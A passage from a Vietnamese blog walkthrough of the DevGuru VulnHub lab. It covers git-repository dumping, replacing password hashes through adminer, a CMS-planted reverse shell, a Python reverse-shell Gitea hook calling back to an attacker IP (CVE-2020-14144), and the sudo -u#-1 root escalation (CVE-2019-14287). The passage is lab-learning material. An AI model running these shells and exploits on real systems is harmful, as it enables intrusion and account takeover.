/services/</span><br><span class="line">[21:30:10] 301 -  312B  - /storage  -&gt;  http://10.10.10.11/storage/</span><br><span class="line">[21:30:12] 301 -  311B  - /themes  -&gt;  http://10.10.10.11/themes/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+<p>Ố ồ! Một đống thứ liên quan đến <em>git</em>, ờ thế… <em>git</em> là gì?</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://vi.wikipedia.org/wiki/Git_(ph%E1%BA%A7n_m%E1%BB%81m)">https://vi.wikipedia.org/wiki/Git_(ph%E1%BA%A7n_m%E1%BB%81m)</a><br>Git (&#x2F;ɡɪt&#x2F;, đọc là “Ghít”) là phần mềm quản lý mã nguồn phân tán được phát triển bởi Linus Torvalds vào năm 2005, ban đầu dành cho việc phát triển nhân Linux. Hiện nay, Git trở thành một trong các phần mềm quản lý mã nguồn phổ biến nhất. Git là phần mềm mã nguồn mở được phân phối theo giấy phép công cộng GPL2.</p>
+</blockquote>
+<p>Ờm, đại khái nó là một thứ giúp cho việc quản lý mã nguồn được ngon nghẻ hơn, cái này thì anh em nào làm dev sẽ quá là rõ. Git khiến việc phát triển dự án dễ dàng hơn, đặc biệt khi phát triển theo team, tránh các “xung đột” không đáng có trong code và rất nhiều lợi ích khác mà nó đem lại.<br>Và với nhiều lợi ích như thế, <em>git</em> thực sự phổ biến. Nhưng việc sử dụng <em>git</em> một cách hiệu quả và an toàn thì không phải ai cũng nắm được.<br>Khái niệm cơ bản của <em>git</em>, là nó lưu lại tất cả các phiên bản sau mỗi lần thực hiện commit. Điều này là một lợi ích to lớn, vì khi phiên bản mới gặp lỗi và chưa thể khắc phục, nhà phát triển có thể sử dụng phiên bản trước đó đã được lưu trong <em>git</em> để roll back lại. Đây cũng là lí do khiến <em>git</em>, nếu không được cấu hình đúng cách, nó sẽ khiến toàn bộ mã nguồn từ trước đến nay của dự án bị lộ, hoặc password, private key, thông tin cấu hình… bị đánh cắp.<br>Vậy thì mấy cái xàm xàm tôi nói ở trên thì liên quan đéo gì đến bài này. Nhìn kìa. Cả một đống thông tin liên quan đến <em>git</em> lù lù thế kia, giờ làm cách nào đó để đem nó về máy mình và mổ xẻ, tôi hoàn toàn có thể có được mã nguồn của trang này. Thử xem nhé.</p>
+<h3 id="Git-Dumper"><a href="#Git-Dumper" class="headerlink" title="Git Dumper"></a>Git Dumper</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./gitdumper.sh  http://10.10.10.13/.git/ ~/boot2root/devguru</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">GitDumper is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Use at your own risk. Usage might be illegal in certain circumstances.</span></span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Only <span class="keyword">for</span> educational purposes!</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##########</span></span></span><br><span class="line"></span><br><span class="line">[*] Destination folder does not exist</span><br><span class="line">[+] Creating /home/#####/boot2root/devguru/.git/</span><br><span class="line">[+] Downloaded: HEAD</span><br><span class="line">[-] Downloaded: objects/info/packs</span><br><span class="line">[+] Downloaded: description</span><br><span class="line">[+] Downloaded: config</span><br><span class="line">[+] Downloaded: COMMIT_EDITMSG</span><br><span class="line">[+] Downloaded: index</span><br><span class="line">[-] Downloaded: packed-refs</span><br><span class="line">[+] Downloaded: refs/heads/master</span><br><span class="line">[-] Downloaded: refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: refs/stash</span><br><span class="line">[+] Downloaded: logs/HEAD</span><br><span class="line">[+] Downloaded: logs/refs/heads/master</span><br><span class="line">[-] Downloaded: logs/refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: info/refs</span><br><span class="line">[+] Downloaded: info/exclude</span><br><span class="line">[-] Downloaded: /refs/wip/index/refs/heads/master</span><br><span class="line">[-] Downloaded: /refs/wip/wtree/refs/heads/master</span><br><span class="line">[-] Downloaded: objects/24/f020e71d01899c89a440e2e8e5d65d016f9473</span><br><span class="line">[-] Downloaded: objects/3f/1f4cd74e0cea0d64ab9a14875954fb0c39eeaf</span><br><span class="line">[-] Downloaded: objects/4d/d5e1d2e02195ac03ed685ac05024f0faef128a</span><br><span class="line">[-] Downloaded: objects/72/819740b89eb5f315808c8648d55bd2db369493</span><br><span class="line">[-] Downloaded: ...bla...bla...bla...</span><br></pre></td></tr></table></figure>
+<p>Chống cằm 3 phút cuối cùng nó cũng tải xong một đống thứ lằng nhằng.<br>Vào thư mục mà tôi vừa tải một đống thứ kia về, kiểm tra git log, git status các kiểu xem sao.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span></span></span><br><span class="line">commit 7de9115700c5656c670b34987c6fbffd39d90cf2 (HEAD -&gt; master)</span><br><span class="line">Author: frank &lt;frank@devguru.local&gt;</span><br><span class="line">Date:   Thu Nov 19 18:42:03 2020 -0600</span><br><span class="line"></span><br><span class="line">    first commit</span><br></pre></td></tr></table></figure>
+<p>Okay, có mỗi cái <em>first commit</em> thôi, giờ thì checkout nó ra để xem điều bất cmn ngờ.<br>Ở đây tôi muốn checkout ra phiên bản mới nhất, nên dùng dấu chấm, còn muốn chọn phiên bản nào để checkout thì copy 7 ký tự đầu của cái hash kia kìa rồi paste vào (<em>VD: git checkout 7de9115</em>)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout .</span></span><br><span class="line">Updated 2491 paths from the index</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -al</span></span><br><span class="line">total 416</span><br><span class="line">drwxr-xr-x 9 ##### #####   4096 Jan  2 20:55 .</span><br><span class="line">drwxr-xr-x 3 ##### #####   4096 Jan  2 20:47 ..</span><br><span class="line">-rw-r--r-- 1 ##### ##### 362514 Jan  2 20:55 adminer.php</span><br><span class="line">-rw-r--r-- 1 ##### #####   1640 Jan  2 20:55 artisan</span><br><span class="line">drwxr-xr-x 2 ##### #####   4096 Jan  2 20:55 bootstrap</span><br><span class="line">drwxr-xr-x 2 ##### #####   4096 Jan  2 20:55 config</span><br><span class="line">drwxr-xr-x 6 ##### #####   4096 Jan  2 20:55 .git</span><br><span class="line">-rw-r--r-- 1 ##### #####    413 Jan  2 20:55 .gitignore</span><br><span class="line">-rw-r--r-- 1 ##### #####   1678 Jan  2 20:55 .htaccess</span><br><span class="line">-rw-r--r-- 1 ##### #####   1173 Jan  2 20:55 index.php</span><br><span class="line">drwxr-xr-x 5 ##### #####   4096 Jan  2 20:55 modules</span><br><span class="line">drwxr-xr-x 3 ##### #####   4096 Jan  2 20:55 plugins</span><br><span class="line">-rw-r--r-- 1 ##### #####   1518 Jan  2 20:55 README.md</span><br><span class="line">-rw-r--r-- 1 ##### #####    551 Jan  2 20:55 server.php</span><br><span class="line">drwxr-xr-x 6 ##### #####   4096 Jan  2 20:55 storage</span><br><span class="line">drwxr-xr-x 4 ##### #####   4096 Jan  2 20:55 themes</span><br></pre></td></tr></table></figure>
+<p>Boom! Toàn bộ mã nguồn của cái web này ở đây cả &#x3D;)) mà cũng quên béng mất cái URL dẫn đến trang login vào cơ sở dữ liệu là <em>adminer.php</em>.<br><img src="/2020/12/27/devguru-vulnhub/pic2.png"><br>Vào xem file cấu hình database lấy username password rồi login vào thôi, ez game.<br>Lúc này, sau khi login thành công vào, thấy có cái bảng liên quan đến backend_users, mặt mũi nó như thế này này.<br><img src="/2020/12/27/devguru-vulnhub/pic3.png"><br>Có thể thấy ngay mật khẩu người dùng được mã hóa sử dụng bcrypt, một dạng hash để phòng tránh việc brute-force. Ùi giời ơi, vào đến đây rồi thì việc đéo gì phải brute-force cho mệt, tạo luôn một cái hash bcrypt chèn thẳng vào là xong à!<br>Để ý mật khẩu của frank đang là:<br><strong>$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK</strong><br>Với <strong>$2y$10</strong>, có nghĩa rằng bcrypt ở đây đang có số rounds là 10. EZ!!!<br>Đây là hash của tôi với password là <strong>00000</strong>.<br><strong>$2y$10$HiSr8anMnFN&#x2F;kx1.bKKUe.eHPWNBEetsTVj4aNibZcYu71bcRychm</strong><br>Chèn nó vào ô password, chiếm được tài khoản frank. Sorry Frank &#x3D;))<br>Login vào &#x2F;backend nào!<br><img src="/2020/12/27/devguru-vulnhub/pic4.png"><br>Chuyển sang CMS, khá buồn cười là cái Framework này cho phép chỉnh sửa code ngay trên trang quản trị CMS, ở đây có thể upload ảnh ọt, file, chèn code bla bla vân vân mây mây, có một đống cách để có được shell.<br>Sau một hồi ngồi làm quen cú pháp, giờ thì chèn reverse shell vào.<br><img src="/2020/12/27/devguru-vulnhub/pic5.png"><br>Save lại, và đồng thời phải bật netcat để lắng nghe trên cổng đã đặt trước trong code kia (<em>port 22222</em>). Đoạn code này sẽ được thực thi khi mà page Home được load, vậy nên giờ chỉ cần truy cập vào nó là đã lấy được www-data shell rồi.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -nlvp 22222</span>                                                                                 </span><br><span class="line">listening on [any] 22222 ...</span><br><span class="line">connect to [10.10.10.1] from (UNKNOWN) [10.10.10.13] 54142</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+<p>Okay, có shell rồi, nhưng chẳng làm được gì nhiều, ít ra làm được mấy trò hay ho. Xem xem machine này đang có những user nào.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class="line">frank:x:1000:1000:,,,:/home/frank:/bin/bash</span><br><span class="line">mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false</span><br></pre></td></tr></table></figure>
+<p>Hmm, có mỗi thằng frank, www-data cũng không có quyền đọc thư mục <em>&#x2F;home&#x2F;frank</em>.<br>Kiểm tra xem frank có đang chạy cái gì hay không.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ps -aux | grep frank</span></span><br><span class="line">frank      610  0.7 19.8 1442108 200500 ?      Ssl  14:04   0:04 /usr/local/bin/gitea web --config /etc/gitea/app.ini</span><br></pre></td></tr></table></figure>
+<p>Thấy được là frank đang chạy Gitea, cái web trên cổng 8585 ban nãy nmap quét được ấy. Vẫn hơi bí. Dùng <em>linPEAS</em> xem sao…</p>
+<h3 id="LinPEAS"><a href="#LinPEAS" class="headerlink" title="LinPEAS"></a>LinPEAS</h3><p><em><a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></em><br>Chống cằm ngồi xem linPEAS nó xổ ra một đống loằng toằng ngoằng, phát hiện được một dòng này cực hay ho…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] Backup files?</span><br><span class="line">-rw-r--r-- 1 frank frank 56688 Nov 19 19:34 /var/backups/app.ini.bak</span><br></pre></td></tr></table></figure>
+<p>Đây có thể là file backup của file cấu hình <em>app.ini</em>, là file cấu hình của cái thằng Gitea trên cổng 8585 kia kìa. Trong đấy thể éo nào cũng một đống tài khoản mật khẩu cho mà xem &#x3D;))</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /var/backups/app.ini.bak</span></span><br><span class="line">...</span><br><span class="line">; The protocol the server listens on. One of &#x27;http&#x27;, &#x27;https&#x27;, &#x27;unix&#x27; or &#x27;fcgi&#x27;.</span><br><span class="line">PROTOCOL                              = http</span><br><span class="line">DOMAIN                                = devguru.local</span><br><span class="line">ROOT_URL                              = http://devguru.local:8585/</span><br><span class="line">; when STATIC_URL_PREFIX is empty it will follow ROOT_URL</span><br><span class="line">STATIC_URL_PREFIX                     = </span><br><span class="line">; The address to listen on. Either a IPv4/IPv6 address or the path to a unix socket.</span><br><span class="line">HTTP_ADDR                             = 0.0.0.0</span><br><span class="line">; The port to listen on. Leave empty when using a unix socket.</span><br><span class="line">HTTP_PORT                             = 8585</span><br><span class="line">...</span><br><span class="line">[database]</span><br><span class="line">; Database to use. Either &quot;mysql&quot;, &quot;postgres&quot;, &quot;mssql&quot; or &quot;sqlite3&quot;.</span><br><span class="line">DB_TYPE                               = mysql</span><br><span class="line">HOST                                  = 127.0.0.1:3306</span><br><span class="line">NAME                                  = gitea</span><br><span class="line">USER                                  = gitea</span><br><span class="line">; Use PASSWD = `your password` for quoting if you use special characters in the password.</span><br><span class="line">PASSWD                                = UfFPTF8C8jjxVF2m</span><br><span class="line">...</span><br><span class="line">; Password Hash algorithm, either &quot;argon2&quot;, &quot;pbkdf2&quot;, &quot;scrypt&quot; or &quot;bcrypt&quot;</span><br><span class="line">PASSWORD_HASH_ALGO                    = pbkdf2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>Vậy là có được thông tin đăng nhập vào database, và thông tin liên quan đến thuật toán mã hóa được sử dụng. Database được chạy chung trên cổng 3306 nên tôi hoàn toàn có thể sử dụng <em>&#x2F;adminer</em> để đăng nhập vào.<br>Sau khi đăng nhập, thấy có một bảng <em>user</em>, trong đó có tài khoản của frank, với mật khẩu mã hóa kiểu gì éo biết, nhưng ở ngay dưới đó, phần passwd_hash_algo đang có giá trị là pbkdf2. Để chiếm được tài khoản Gitea của frank, lúc này sẽ phải thay đổi passwd với hash là mật khẩu đã biết.<br>Đến đây thì có 2 cách làm:</p>
+<ul>
+<li>Cách 1: PBKDF2 yêu cầu 5 tham số đầu vào, đó là Password, Salt, Hash function, Iterations count và Key length. Password và Salt thì có thể tùy ý, nhưng 3 cái còn lại thì tuyệt đối đúng. Nên là phải đi tìm :&#x2F;</li>
+<li>Cách 2: Như thông tin có được trên <em>app.ini.bak</em>, passwd_hash_algo chấp nhận 4 loại hash, trong 4 loại này, quen nhất vẫn là bcrypt. Ơ thế, giờ điền mật khẩu hash là bcrypt và để passwd_hash_algo là bcrypt thì sao nhở.<br>Để thể hiện tôi là người thừa thời gian, tôi sẽ làm cả 2 cách :D</li>
+</ul>
+<p>Với cách 1, Google và Google thật nhiều, với từ khóa là <em>pbkdf2 gitea default</em>, tôi tìm được:</p>
+<ul>
+<li>Hash function: SHA256</li>
+<li>Iterations count: 10000</li>
+<li>Key length: 50</li>
+</ul>
+<p>Giờ thì dễ rồi, dán cái đống này vào một cái chương trình gen PBKDF2 nào đó, rồi chèn hash vào ô passwd là xong thôi.<br>Thể hiện là biết python, nên tôi sẽ tự code, với password là <strong>00000</strong> và salt là <strong>botcanhHaiChau</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, binascii</span><br><span class="line"><span class="keyword">from</span> backports.pbkdf2 <span class="keyword">import</span> pbkdf2_hmac</span><br><span class="line"></span><br><span class="line">salt = binascii.unhexlify(<span class="string">&#x27;botcanhHaiChau&#x27;</span>) <span class="comment">#Ahihi</span></span><br><span class="line">passwd = <span class="string">&quot;00000&quot;</span>.encode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">key = pbkdf2_hmac(<span class="string">&quot;sha256&quot;</span>, passwd, salt, <span class="number">10000</span>, <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(key))</span><br><span class="line"></span><br><span class="line"><span class="comment">#7b54b6d699cbf4d2ec3561baf57ebcbfe086e75dbecea8910dade1991eff67c3d139e78ffc26bec1e95b46fbd16a2eeabbf6</span></span><br></pre></td></tr></table></figure>
+<p><em>Lời nhắn dành cho ai dùng đoạn code trên để làm bài này nhưng vẫn bị sai: Try hard don’t copy!</em></p>
+<p>Với cách 2, nghe chừng dễ dàng và đỡ tốn thời gian hơn cách 1 rất nhiều. Thực ra lần đầu làm bài này tôi đã mất cả buổi trưa để đuổi theo cách 1, do không để ý những cấu hình khác trong <em>app.ini.bak</em>. Để thực hiện thì giống hệt với cách đổi mật khẩu của frank trên trang &#x2F;backend.<br><img src="/2020/12/27/devguru-vulnhub/pic8.png"><br>Với phiên bản Gitea 1.12.5, có một lỗi CVE-2020-14144(<a target="_blank" rel="noopener" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14144">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14144</a>) dẫn đến RCE. Nếu có thể khai thác được lỗi này thành công, thì tôi hoàn toàn có được shell của thằng user frank trong hệ thống dó Gitea được chạy dưới quyền của frank.<br>Cơ bản, với lỗi CVE này, nó đánh vào quá trình xử lý của hook trên phía server, ơ thế… hook là gì?<br><em>Read &gt;&gt;&gt; <a target="_blank" rel="noopener" href="https://viblo.asia/p/introduction-to-git-hooks-1qm6RWaNGeJE">https://viblo.asia/p/introduction-to-git-hooks-1qm6RWaNGeJE</a></em><br>…<br>Giờ thì tạo một cái Repo mới, sau đó sẽ chèn đoạn mã lấy shell vào 1 trong 3 hook server.<br>Nội dung <em>post-receive</em> lủn củn như thế này:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">python3 -c</span><br><span class="line"><span class="string">&#x27;import socket,subprocess,os;</span></span><br><span class="line"><span class="string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span></span><br><span class="line"><span class="string">s.connect((&quot;10.10.10.1&quot;,22224));</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),0);</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),1);</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),2);</span></span><br><span class="line"><span class="string">import pty;</span></span><br><span class="line"><span class="string">pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>Tạo một thay đổi nào đó trong cái thư mục Duma vừa mới clone về kia, rồi commit, push lên cho Gitea và có được shell &#x3D;))</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -nlvp 22224</span></span><br><span class="line">listening on [any] 22224 ...</span><br><span class="line">connect to [10.10.10.1] from (UNKNOWN) [10.10.10.13] 42062</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=1000(frank) gid=1000(frank) groups=1000(frank)</span><br></pre></td></tr></table></figure>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><p>Okay, đến màn khó rồi đây.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> -l</span></span><br><span class="line">Matching Defaults entries for frank on devguru:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User frank may run the following commands on devguru:</span><br><span class="line">    (ALL, !root) NOPASSWD: /usr/bin/sqlite3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">uname</span> -a</span></span><br><span class="line">Linux devguru.local 4.15.0-124-generic #127-Ubuntu SMP Fri Nov 6 10:54:43 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+<p>Với <em>&#x2F;usr&#x2F;bin&#x2F;sqlite3</em>, có thể lên được Root theo cách này <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/sqlite3/">https://gtfobins.github.io/gtfobins/sqlite3/</a><br>NHƯNG! <em>(ALL, !root)</em>, cái này ngăn cản root thực hiện, mọi người dùng khác đều được, trừ root :(<br>Sau khi được hint là kiểm tra phiên bản của <em>sudo</em>, wtf, tôi chưa bao giờ kiểm tra phiên bản của <em>sudo</em> cả! Trước giờ vẫn nghĩ nó là một phần của hệ thống và được phát triển song song, nên không có phiên bản &#x3D;))</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> --version</span></span><br><span class="line">Sudo version 1.8.21p2</span><br><span class="line">Sudoers policy plugin version 1.8.21p2</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.21p2</span><br></pre></td></tr></table></figure>
+<p>Sudo v1.8.21 có một lỗi nghiêm trọng ra phết, được gọi là <em>User -1</em>. <a target="_blank" rel="noopener" href="https://www.cybersecurity-help.cz/vdb/SB2019101501">CVE-2019-14287</a>.<br>Thử trước đã rồi hiểu nó sau :v</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> -u#-1 sqlite3 /dev/null <span class="string">&#x27;.shell /bin/sh&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=0(root) gid=1000(frank) groups=1000(frank)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">msg.txt  root.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> root.txt</span></span><br><span class="line">96440606fb88aa7497cde5a8e68daf8f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> msg.txt</span></span><br><span class="line">	   Congrats on rooting DevGuru!</span><br><span class="line">  Contact me via Twitter @zayotic to give feedback!</span><br></pre></td></tr></table></figure>
